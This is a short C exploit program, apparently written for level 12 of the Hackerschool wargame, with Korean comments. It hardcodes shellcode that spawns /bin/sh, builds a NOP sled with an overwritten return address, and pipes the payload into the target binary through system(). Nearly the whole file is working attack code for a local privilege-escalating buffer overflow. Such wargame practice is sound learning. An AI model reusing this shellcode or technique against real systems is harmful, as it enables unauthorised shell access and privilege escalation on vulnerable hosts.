/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level12
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 272   /* NOP(219) + shellcode(45) + sfp(4) + ret(4)*/

// 배시셸을 실행시키는 셸코드 + char str[256] 배열의 시작 주소
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"
    "\xd0\xf9\xff\xbf";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
	// 셸코드의 길이 확인
    shellLen = strlen(shellcode);
	
	// 셸코드 앞부분까지 NOP 할당
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
		
    // NOP 뒤에 셸코드 할당
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = shellcode[j];
    
    // (perl -e 'print "NOPs....Shellcode...[SFP][RET]"'; cat) | /home/level12/attackme 명령어
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level12/attackme");
    strcat(cmdBuf, "\x0a");
	system(cmdBuf);
}